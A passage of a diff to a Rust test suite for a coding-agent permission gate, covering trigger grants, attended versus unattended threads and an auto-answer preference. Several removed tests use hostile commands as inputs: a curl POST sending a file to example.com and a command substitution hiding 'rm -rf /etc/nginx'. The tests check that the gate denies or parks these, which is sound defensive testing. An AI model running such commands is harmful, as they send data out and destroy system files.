-    async fn resolve_attend_mode_human_device_is_interactive() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let thread_id = Uuid::new_v4();
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "MessageReceived",
-            &MessageOrigin::Device {
-                device_id: "d1".into(),
-            },
-        )
-        .await;
-        let mode = resolve_attend_mode(&pool, &empty_trigger_configs(), thread_id).await;
-        assert_eq!(mode, AttendMode::Interactive);
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    #[tokio::test]
-    async fn resolve_attend_mode_trigger_root_inherits_grant() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-1";
-        let thread_id = Uuid::new_v4();
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::ExternalApi]);
-        let mode = resolve_attend_mode(&pool, &cfgs, thread_id).await;
-        assert_eq!(
-            mode,
-            AttendMode::Unattended {
-                grant: vec![SideEffectCategory::ExternalApi],
-                wait: None,
-            }
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    #[tokio::test]
-    async fn resolve_attend_mode_walks_agent_subthread_to_trigger_root() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-2";
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        insert_child_spawn_event(&pool, child, root).await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        let mode = resolve_attend_mode(&pool, &cfgs, child).await;
-        assert_eq!(
-            mode,
-            AttendMode::Unattended {
-                grant: vec![SideEffectCategory::Email],
-                wait: None,
-            }
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// The trigger asked the user a question, the user answered it, and the
-    /// agent spawned a coding-agent child on the strength of that answer. The
-    /// user is reachable, so the child asks instead of inheriting the grant.
-    #[tokio::test]
-    async fn resolve_attend_mode_human_answer_on_the_trigger_run_attends_its_child() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-answered";
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        insert_answer_event(&pool, root, &device("d1")).await;
-        insert_child_spawn_event(&pool, child, root).await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        assert_eq!(
-            resolve_attend_mode(&pool, &cfgs, child).await,
-            AttendMode::Interactive
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// Nobody touched the trigger run, but the user is now writing in the
-    /// coding-agent thread itself.
-    #[tokio::test]
-    async fn resolve_attend_mode_human_message_in_the_child_attends_it() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-messaged";
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        insert_child_spawn_event(&pool, child, root).await;
-        insert_origin_event(&pool, child, "MessageReceived", &device("d1")).await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        assert_eq!(
-            resolve_attend_mode(&pool, &cfgs, child).await,
-            AttendMode::Interactive
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// Orphan recovery answers a question as the engine, and an agent writes
-    /// the spawn message. Neither is a human, so the grant still flows.
-    #[tokio::test]
-    async fn resolve_attend_mode_engine_answer_keeps_the_trigger_grant() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-engine-answer";
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        insert_answer_event(&pool, root, &MessageOrigin::System).await;
-        insert_child_spawn_event(&pool, child, root).await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        assert_eq!(
-            resolve_attend_mode(&pool, &cfgs, child).await,
-            AttendMode::Unattended {
-                grant: vec![SideEffectCategory::Email],
-                wait: None,
-            }
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// A child moved to top level keeps its spawn event, which still names the
-    /// trigger thread as parent. The walk must stop at the move anyway, or the
-    /// thread the user cut loose keeps auto-approving side effects (ADR 0278).
-    #[tokio::test]
-    async fn resolve_attend_mode_moved_child_does_not_inherit_trigger_grant() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-moved";
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        let grandchild = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        insert_child_spawn_event(&pool, child, root).await;
-        insert_child_spawn_event(&pool, grandchild, child).await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        assert!(
-            matches!(
-                resolve_attend_mode(&pool, &cfgs, grandchild).await,
-                AttendMode::Unattended { .. }
-            ),
-            "before the move the whole subtree inherits the trigger's grant"
-        );
-
-        sqlx::query(
-            "INSERT INTO events (id, aggregate, aggregate_id, event_type, payload, created, thread_id) \
-             VALUES ($1, 'thread', $2, 'ChildThreadDetached', $3, NOW(), $2::uuid)",
-        )
-        .bind(Uuid::new_v4())
-        .bind(root.to_string())
-        .bind(serde_json::json!({ "child_thread_id": child }))
-        .execute(&pool)
-        .await
-        .unwrap();
-
-        for thread in [child, grandchild] {
-            assert_eq!(
-                resolve_attend_mode(&pool, &cfgs, thread).await,
-                AttendMode::Interactive,
-                "a moved subtree asks a human"
-            );
-        }
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// A `relation: "top"` spawn stamps a `ThreadLink` origin naming its
-    /// spawning thread (so the route popover can link back) but carries NO
-    /// `parent_thread_id`. Attribution must not lend it the spawning thread's trigger
-    /// grant: the thread was asked to run independently, so an unresolvable
-    /// permission request waits for a human instead of auto-approving a
-    /// real-world side effect.
-    #[tokio::test]
-    async fn resolve_attend_mode_top_spawn_does_not_inherit_trigger_grant() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-top";
-        let root = Uuid::new_v4();
-        let spawned = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        // Origin without linkage: the top-spawn shape.
-        insert_origin_event(&pool, spawned, "MessageReceived", &parent_link(root)).await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        let mode = resolve_attend_mode(&pool, &cfgs, spawned).await;
-        assert_eq!(
-            mode,
-            AttendMode::Interactive,
-            "a top spawn names its spawning thread for display, but is not in its privilege tree"
-        );
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// `lucidos spawn-thread --relation top` stamps a `Workspace` origin with
-    /// `mode: agent`, even for a target in the caller's own workspace. It is a
-    /// top spawn like the tool's, so it asks a human and inherits no grant.
-    #[tokio::test]
-    async fn resolve_attend_mode_cli_top_spawn_asks_a_human() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let trigger_id = "trig-cli-top";
-        let root = Uuid::new_v4();
-        let spawned = Uuid::new_v4();
-        let from_elsewhere = Uuid::new_v4();
-        insert_origin_event(&pool, root, "TriggerStarted", &scheduler_origin(trigger_id)).await;
-        let workspace_origin = |thread_id, mode| MessageOrigin::Workspace {
-            workspace: "myws".into(),
-            thread_id,
-            event_id: None,
-            user_agent: None,
-            mode,
-        };
-        insert_origin_event(
-            &pool,
-            spawned,
-            "MessageReceived",
-            &workspace_origin(Some(root), ActorMode::Agent),
-        )
-        .await;
-        insert_origin_event(
-            &pool,
-            from_elsewhere,
-            "MessageReceived",
-            &workspace_origin(None, ActorMode::Engine),
-        )
-        .await;
-        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::Email]);
-        for thread_id in [spawned, from_elsewhere] {
-            assert_eq!(
-                resolve_attend_mode(&pool, &cfgs, thread_id).await,
-                AttendMode::Interactive,
-                "a top spawn from the CLI waits for a human, like the tool's"
-            );
-        }
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    #[tokio::test]
-    async fn resolve_attend_mode_human_rooted_subthread_is_interactive() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let root = Uuid::new_v4();
-        let child = Uuid::new_v4();
-        insert_origin_event(
-            &pool,
-            root,
-            "MessageReceived",
-            &MessageOrigin::Device {
-                device_id: "d".into(),
-            },
-        )
-        .await;
-        insert_child_spawn_event(&pool, child, root).await;
-        let mode = resolve_attend_mode(&pool, &empty_trigger_configs(), child).await;
-        assert_eq!(mode, AttendMode::Interactive);
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    #[tokio::test]
-    async fn resolve_attend_mode_no_origin_is_interactive() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let mode = resolve_attend_mode(&pool, &empty_trigger_configs(), Uuid::new_v4()).await;
-        assert_eq!(mode, AttendMode::Interactive);
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    // --- unattended prompt path (DB-backed) --------------------------------
-
-    #[tokio::test]
-    async fn unattended_trigger_session_auto_allows_benign_without_card() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-benign";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "MessageReceived",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        let cfgs = trigger_configs_with(trigger_id, vec![]);
-
-        // No broadcast is ever fired — if the call WAITED for a card, the timeout
-        // would fire and fail the test. That is the no-hang invariant.
-        let outcome = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &cfgs,
-                Path::new("/ws"),
-                // Command requests — the worktree fast path never covers them.
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "i".into(),
-                    tool_name: "command_execution".into(),
-                    input: serde_json::json!({
-                        "command": "/bin/zsh -lc 'lucidos data write artifacts/work-tracker/data.json --from /tmp/x.json'"
-                    }),
-                },
-            ),
-        )
-        .await
-        .expect("unattended resolve must not hang");
-        assert!(outcome.allowed, "benign in-workspace write auto-allows");
-
-        assert_eq!(
-            count_permission_events(&pool, thread_id).await,
-            (0, 0),
-            "an unattended ALLOW renders no card and records nothing"
-        );
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// The whole point of the gate, end to end: a human is watching, codex asks
-    /// to escape its sandbox for a process probe, and no card is raised.
-    #[tokio::test]
-    async fn attended_session_auto_allows_a_classified_escalation() {
+    async fn a_classified_escalation_needs_no_card() {
         use crate::test_support::{setup_test_db, teardown_test_db};
         let (pool, db_name) = setup_test_db().await;
         let (bus, _rx) = EventBus::new(pool.clone());
         let pending = Arc::new(Mutex::new(PermissionState::default()));
         let thread_id = Uuid::new_v4();
         seed_cc_thread(&bus, thread_id).await;
-        // No origin event, so `resolve_attend_mode` reads the thread as
-        // interactive and the unattended branch never fires.
 
         let outcome = tokio::time::timeout(
             std::time::Duration::from_secs(5),
@@ -5474,7 +3570,6 @@ mod tests {
                 &pool,
                 &bus,
                 &pending,
-                &empty_trigger_configs(),
                 Path::new("/ws"),
                 None,
                 None,
@@ -5501,52 +3596,51 @@ mod tests {
         teardown_test_db(&db_name).await;
     }
 
-    /// The flag reader is gated on the master switch and resolves on by default.
+    /// Auto-answer defaults off and never reads the master guard: turning
+    /// safety on never answers a card the user did not hand over.
     #[tokio::test]
-    async fn the_coding_agent_flag_is_read_only_under_the_master_guard() {
+    async fn auto_answer_defaults_off_and_ignores_the_master_guard() {
         use crate::core::preferences::PreferenceStore;
+        use crate::core::prefs::{CODING_AGENT_AUTO_ANSWER, COMMAND_GUARD};
         use crate::test_support::{setup_test_db, teardown_test_db};
         let (pool, db_name) = setup_test_db().await;
-        use crate::core::prefs::{COMMAND_GUARD, COMMAND_GUARD_CODING_AGENTS};
         let set = |key: &'static str, value: &'static str| {
             PreferenceStore::set_row_for_test(&pool, key, value)
         };
-        assert!(
-            !command_guard_covers_coding_agents(&pool).await,
-            "the master guard is off by default, so the child switch is not read"
-        );
+        assert!(!coding_agent_auto_answer(&pool).await, "off by default");
         set(COMMAND_GUARD.key(), "true").await.unwrap();
         assert!(
-            command_guard_covers_coding_agents(&pool).await,
-            "on by default under the master guard"
+            !coding_agent_auto_answer(&pool).await,
+            "the master guard does not turn it on"
         );
-        set(COMMAND_GUARD_CODING_AGENTS.key(), "false")
-            .await
-            .unwrap();
-        assert!(!command_guard_covers_coding_agents(&pool).await);
+        set(COMMAND_GUARD.key(), "false").await.unwrap();
+        set(CODING_AGENT_AUTO_ANSWER.key(), "true").await.unwrap();
+        assert!(
+            coding_agent_auto_answer(&pool).await,
+            "on with the master guard off"
+        );
         pool.close().await;
         teardown_test_db(&db_name).await;
     }
 
-    /// End to end for Claude Code: a `Bash` card reaches the gate only with the
-    /// flag on, and without a judge handle only the static half answers.
+    /// End to end for Claude Code: a `Bash` card reaches the gate only under
+    /// auto-answer, whatever the master guard says. Without a judge handle only
+    /// the static half answers.
     #[tokio::test]
-    async fn an_attended_bash_card_is_classified_only_under_the_flag() {
+    async fn a_bash_card_is_classified_only_under_auto_answer() {
         use crate::core::preferences::PreferenceStore;
-        use crate::core::prefs::{COMMAND_GUARD, COMMAND_GUARD_CODING_AGENTS};
+        use crate::core::prefs::{CODING_AGENT_AUTO_ANSWER, COMMAND_GUARD};
         use crate::test_support::{setup_test_db, teardown_test_db};
         let (pool, db_name) = setup_test_db().await;
         let (bus, _rx) = EventBus::new(pool.clone());
         let pending = Arc::new(Mutex::new(PermissionState::default()));
         let thread_id = Uuid::new_v4();
         seed_cc_thread(&bus, thread_id).await;
-        let triggers = empty_trigger_configs();
         let ask = || {
             prompt_coding_agent_permission(
                 &pool,
                 &bus,
                 &pending,
-                &triggers,
                 Path::new("/ws"),
                 None,
                 None,
@@ -5559,49 +3653,47 @@ mod tests {
             )
         };
 
-        PreferenceStore::set_row_for_test(&pool, COMMAND_GUARD.key(), "true")
-            .await
-            .unwrap();
-        PreferenceStore::set_row_for_test(&pool, COMMAND_GUARD_CODING_AGENTS.key(), "true")
+        PreferenceStore::set_row_for_test(&pool, CODING_AGENT_AUTO_ANSWER.key(), "true")
             .await
             .unwrap();
         let outcome = tokio::time::timeout(std::time::Duration::from_secs(5), ask())
             .await
             .expect("a classified Bash card must not wait for a card");
-        assert!(outcome.allowed);
+        assert!(outcome.allowed, "auto-answer answers with the guard off");
         assert_eq!(outcome.reason.as_deref(), Some(COMMAND_GUARD_ALLOW_REASON));
         assert_eq!(count_permission_events(&pool, thread_id).await, (0, 0));
 
-        PreferenceStore::set_row_for_test(&pool, COMMAND_GUARD_CODING_AGENTS.key(), "false")
+        PreferenceStore::set_row_for_test(&pool, CODING_AGENT_AUTO_ANSWER.key(), "false")
+            .await
+            .unwrap();
+        PreferenceStore::set_row_for_test(&pool, COMMAND_GUARD.key(), "true")
             .await
             .unwrap();
         let waiting = tokio::time::timeout(std::time::Duration::from_millis(500), ask()).await;
         assert!(
             waiting.is_err(),
-            "flag off: the Bash card waits for the user"
+            "auto-answer off: the Bash card waits for the user, guard on or not"
         );
 
         pool.close().await;
         teardown_test_db(&db_name).await;
     }
 
-    /// Ordering: the unattended branch returns above the gate, so a trigger
-    /// session keeps deciding on its own grant. Both lanes allow this command,
-    /// so the REASON is what tells them apart.
+    /// A trigger-rooted session takes the same gates as any other, so the
+    /// command gate decides this probe rather than a trigger's grant.
     #[tokio::test]
-    async fn the_unattended_branch_still_owns_a_trigger_session() {
+    async fn a_trigger_session_reaches_the_command_gate() {
         use crate::test_support::{setup_test_db, teardown_test_db};
         let (pool, db_name) = setup_test_db().await;
         let (bus, _rx) = EventBus::new(pool.clone());
         let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-order";
         let thread_id = Uuid::new_v4();
         seed_cc_thread(&bus, thread_id).await;
         insert_origin_event(
             &pool,
             thread_id,
             "TriggerStarted",
-            &scheduler_origin(trigger_id),
+            &scheduler_origin("trig-order"),
         )
         .await;
 
@@ -5609,7 +3701,6 @@ mod tests {
             &pool,
             &bus,
             &pending,
-            &trigger_configs_with(trigger_id, vec![]),
             Path::new("/ws"),
             None,
             None,
@@ -5623,1007 +3714,86 @@ mod tests {
         .await;
 
         assert!(outcome.allowed);
-        assert_eq!(
-            outcome.reason.as_deref(),
-            Some(UNATTENDED_ALLOW_BENIGN_REASON),
-            "the unattended lane decided, so the escalation gate was never reached"
-        );
+        assert_eq!(outcome.reason.as_deref(), Some(COMMAND_GUARD_ALLOW_REASON));
 
         pool.close().await;
         teardown_test_db(&db_name).await;
     }
 
+    /// The reported cards: a main check's fix thread and a lane thread never
+    /// read the workspace's grants, so every refused shape parked a card.
+    /// Whoever started the session, the workspace's own grant covers it.
     #[tokio::test]
-    async fn unattended_trigger_denies_ungranted_side_effect() {
+    async fn every_session_uses_the_workspace_grants_without_a_card() {
         use crate::test_support::{setup_test_db, teardown_test_db};
         let (pool, db_name) = setup_test_db().await;
         let (bus, _rx) = EventBus::new(pool.clone());
         let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-nogrant";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        let cfgs = trigger_configs_with(trigger_id, vec![]); // grants nothing
-
-        let outcome = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &cfgs,
-                Path::new("/ws"),
-                // Command requests — the worktree fast path never covers them.
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "i".into(),
-                    tool_name: "command_execution".into(),
-                    input: serde_json::json!({"command": "/bin/zsh -lc 'curl -X POST https://example.com -d @x'"}),
-                },
-            ),
-        )
-        .await
-        .expect("must not hang");
-        assert!(!outcome.allowed, "ungranted external API auto-denies");
-        // The deny is recorded, so the run is diagnosable from the timeline.
-        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// The unattended amplification of the Safe fast path's refusals. A shape
-    /// the guard would not settle is denied here rather than run, and the deny
-    /// leaves a trace naming the command.
-    #[tokio::test]
-    async fn unattended_trigger_denies_a_refused_shape_and_records_it() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-refused";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-        // Grants everything the category vocabulary can express, to pin that a
-        // refused shape is denied whatever the trigger allows.
-        let cfgs = trigger_configs_with(
-            trigger_id,
-            vec![
-                SideEffectCategory::Other,
-                SideEffectCategory::ExternalApi,
-                SideEffectCategory::OutOfWorkspaceDestruction,
-            ],
-        );
-
-        let outcome = tokio::time::timeout(
-            std::time::Duration::from_secs(5),
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &cfgs,
-                Path::new("/ws"),
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "i".into(),
-                    tool_name: "command_execution".into(),
-                    input: serde_json::json!({
-                        "command": "/bin/zsh -lc 'echo $(rm -rf /etc/nginx)'"
-                    }),
-                },
-            ),
-        )
-        .await
-        .expect("must not hang");
-        assert!(!outcome.allowed, "a refused shape auto-denies");
-        assert_eq!(
-            outcome.reason.as_deref(),
-            Some(UNATTENDED_DENY_UNCLASSIFIED_REASON)
-        );
-        // Request AND resolution, so no card is left unanswered and the thread
-        // is not parked needing attention nobody can give it.
-        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
-        let status: String =
-            sqlx::query_scalar("SELECT status FROM thread_summaries WHERE thread_id = $1")
-                .bind(thread_id)
-                .fetch_one(&pool)
-                .await
-                .expect("status");
-        assert_ne!(
-            status,
-            crate::engine::thread_lifecycle::ThreadStatus::WaitingForUserAnswer.as_str(),
-            "an engine-answered request must not park the thread"
-        );
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// `configs` plus a trigger on `CodingAgentPermissionRequest`, the kind a
-    /// user writes to hear about a parked card.
-    fn with_notifying_trigger(
-        configs: Arc<RwLock<HashMap<String, TriggerConfig>>>,
-        condition: Option<serde_json::Value>,
-        paused: bool,
-    ) -> Arc<RwLock<HashMap<String, TriggerConfig>>> {
-        let mut subscription = serde_json::json!({ "event_type": "CodingAgentPermissionRequest" });
-        if let Some(condition) = condition {
-            subscription["condition"] = condition;
-        }
-        let config = TriggerConfig::from_created_payload(&serde_json::json!({
-            "trigger_id": "notify",
-            "name": "When agent needs me",
-            "on": [subscription],
-            "paused": paused,
-            "run": { "type": "intent", "intent": "tell me a card is waiting" },
-        }))
-        .expect("build TriggerConfig");
-        configs
-            .write()
-            .unwrap()
-            .insert("notify".to_string(), config);
-        configs
-    }
-
-    /// Raise `command` on an unattended trigger run that grants nothing.
-    async fn raise_unattended(
-        pool: &sqlx::PgPool,
-        bus: &EventBus,
-        pending: &Arc<Mutex<PermissionState>>,
-        trigger_configs: Arc<RwLock<HashMap<String, TriggerConfig>>>,
-        thread_id: Uuid,
-        command: &str,
-    ) -> tokio::task::JoinHandle<PermissionPromptOutcome> {
-        let input = serde_json::json!({ "command": command });
-        raise_unattended_tool(
-            pool,
-            bus,
-            pending,
-            trigger_configs,
-            thread_id,
-            "command_execution",
-            input,
-        )
-    }
-
-    /// Raise any tool request on an unattended trigger run.
-    fn raise_unattended_tool(
-        pool: &sqlx::PgPool,
-        bus: &EventBus,
-        pending: &Arc<Mutex<PermissionState>>,
-        trigger_configs: Arc<RwLock<HashMap<String, TriggerConfig>>>,
-        thread_id: Uuid,
-        tool_name: &str,
-        input: serde_json::Value,
-    ) -> tokio::task::JoinHandle<PermissionPromptOutcome> {
-        let (pool, bus, pending) = (pool.clone(), bus.clone(), pending.clone());
-        let tool_name = tool_name.to_string();
-        tokio::spawn(async move {
-            prompt_coding_agent_permission(
-                &pool,
-                &bus,
-                &pending,
-                &trigger_configs,
-                Path::new("/ws"),
-                None,
-                None,
-                CodingAgentPermissionInput {
-                    thread_id,
-                    tool_use_id: "i".into(),
-                    tool_name,
-                    input,
-                },
-            )
-            .await
-        })
-    }
-
-    /// A refused shape on an unattended run, with a trigger that announces the
-    /// card, parks an ordinary card instead of denying. The engine pushes
-    /// nothing itself.
-    #[tokio::test]
-    async fn unattended_trigger_parks_a_refused_shape_when_a_trigger_announces_it() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-parks";
-        let thread_id = Uuid::new_v4();
-        seed_cc_thread(&bus, thread_id).await;
-        insert_origin_event(
-            &pool,
-            thread_id,
-            "TriggerStarted",
-            &scheduler_origin(trigger_id),
-        )
-        .await;
-
-        let waiter = raise_unattended(
-            &pool,
-            &bus,
-            &pending,
-            with_notifying_trigger(trigger_configs_with(trigger_id, vec![]), None, false),
-            thread_id,
-            "/bin/zsh -lc 'echo $(rm -rf /etc/nginx)'",
-        )
-        .await;
-
-        // The entry registers just before its request event is emitted, so
-        // wait for both.
-        let mut request_id = None;
-        for _ in 0..500 {
-            request_id = pending.lock().unwrap().by_request_id.keys().next().cloned();
-            let emitted = count_permission_events(&pool, thread_id).await.0 > 0;
-            if (request_id.is_some() && emitted) || waiter.is_finished() {
-                break;
-            }
-            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
-        }
-        let request_id = request_id.expect("an announcing trigger must park a card");
-        assert_eq!(
-            count_permission_events(&pool, thread_id).await,
-            (1, 0),
-            "the parked card waits for an answer"
-        );
-        let notifications: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM notifications")
-            .fetch_one(&pool)
-            .await
-            .expect("count notifications");
-        assert_eq!(
-            notifications, 0,
-            "the engine writes no notification for a park"
-        );
-        let entry = pending.lock().unwrap().take(&request_id).expect("entry");
-        let _ = entry.tx.send(PermissionAnswer::Allowed);
-
-        let outcome = tokio::time::timeout(std::time::Duration::from_secs(10), waiter)
-            .await
-            .expect("resolves")
-            .expect("task ok");
-        assert!(outcome.allowed, "the user's approval runs the command");
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// The gate asks what dispatch asks. A card at the depth cap fires no
-    /// trigger, and a trigger never wakes on its own fire (ADR 0137).
-    #[tokio::test]
-    async fn a_trigger_announces_only_what_dispatch_would_fire() {
-        use crate::scheduler::user_tasks::{ACTIVE_TRIGGER_ID, EVENT_TRIGGER_DEPTH};
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let configs = with_notifying_trigger(empty_trigger_configs(), None, false);
-        let thread_id = Uuid::new_v4();
-        let input = serde_json::json!({ "command": "rm -rf /etc/nginx" });
-        let offer = GrantOffer::default();
-        let request = PermissionRequestShape {
-            tool_use_id: "i",
-            tool_name: "Bash",
-            input: &input,
-            offer: &offer,
-        };
-        let announces = || a_trigger_announces(&pool, &configs, None, thread_id, &request);
-
-        assert!(announces().await, "an ordinary card wakes the trigger");
-        let ceiling = crate::engine::thread_queue::DEFAULT_MAX_EVENT_TRIGGER_DEPTH;
-        assert!(
-            !EVENT_TRIGGER_DEPTH.scope(ceiling, announces()).await,
-            "dispatch fires nothing at the depth cap"
-        );
-        assert!(
-            !ACTIVE_TRIGGER_ID
-                .scope("notify".to_string(), announces())
-                .await,
-            "the notify trigger's own fire does not wake it"
-        );
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// A card nobody would hear about never parks: with no trigger on the
-    /// request, a paused one, or one whose condition excludes it, the refusal
-    /// stays immediate and keeps saying nobody was there to ask.
-    #[tokio::test]
-    async fn unattended_trigger_still_denies_a_refused_shape_when_no_trigger_announces_it() {
-        use crate::test_support::{setup_test_db, teardown_test_db};
-        let (pool, db_name) = setup_test_db().await;
-        let (bus, _rx) = EventBus::new(pool.clone());
-        let pending = Arc::new(Mutex::new(PermissionState::default()));
-        let trigger_id = "trig-unannounced";
-        let registries = [
-            trigger_configs_with(trigger_id, vec![]),
-            with_notifying_trigger(trigger_configs_with(trigger_id, vec![]), None, true),
-            with_notifying_trigger(
-                trigger_configs_with(trigger_id, vec![]),
-                Some(serde_json::json!({ "tool_name": "Write" })),
-                false,
-            ),
-        ];
-        for configs in registries {
-            let thread_id = Uuid::new_v4();
-            seed_cc_thread(&bus, thread_id).await;
-            insert_origin_event(
-                &pool,
-                thread_id,
-                "TriggerStarted",
-                &scheduler_origin(trigger_id),
-            )
-            .await;
-
-            let waiter = raise_unattended(
-                &pool,
-                &bus,
-                &pending,
-                configs,
-                thread_id,
-                "/bin/zsh -lc 'echo $(rm -rf /etc/nginx)'",
-            )
-            .await;
-            let outcome = tokio::time::timeout(std::time::Duration::from_secs(5), waiter)
-                .await
-                .expect("must not hang")
-                .expect("task ok");
-
-            assert!(!outcome.allowed);
-            assert_eq!(
-                outcome.reason.as_deref(),
-                Some(UNATTENDED_DENY_UNCLASSIFIED_REASON)
-            );
-            assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
-        }
-
-        pool.close().await;
-        teardown_test_db(&db_name).await;
-    }
-
-    /// Only a refused shape parks. Every verdict the grant decides keeps its
-    /// immediate answer, so a human click can never widen a grant. An
-    /// unreadable payload and an engine-state write stay denied too.
-    #[test]
-    fn only_a_refused_shape_may_park_unattended() {
-        let never_park = [
-            RequestVerdict::Benign,
-            RequestVerdict::Catastrophic,
-            RequestVerdict::SideEffect(SideEffectCategory::Email),
-            RequestVerdict::SideEffect(SideEffectCategory::ExternalApi),
-            RequestVerdict::SideEffect(SideEffectCategory::CloudCli),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-            RequestVerdict::SideEffect(SideEffectCategory::SecretRead),
-            RequestVerdict::SideEffect(SideEffectCategory::Other),
-            RequestVerdict::Unclassified(Unsettled::Unreadable),
-            RequestVerdict::Unclassified(Unsettled::EngineState),
-        ];
-        for verdict in never_park {
-            assert!(!unattended_may_park(&verdict), "{verdict:?} must not park");
-        }
-        assert!(unattended_may_park(&RequestVerdict::Unclassified(
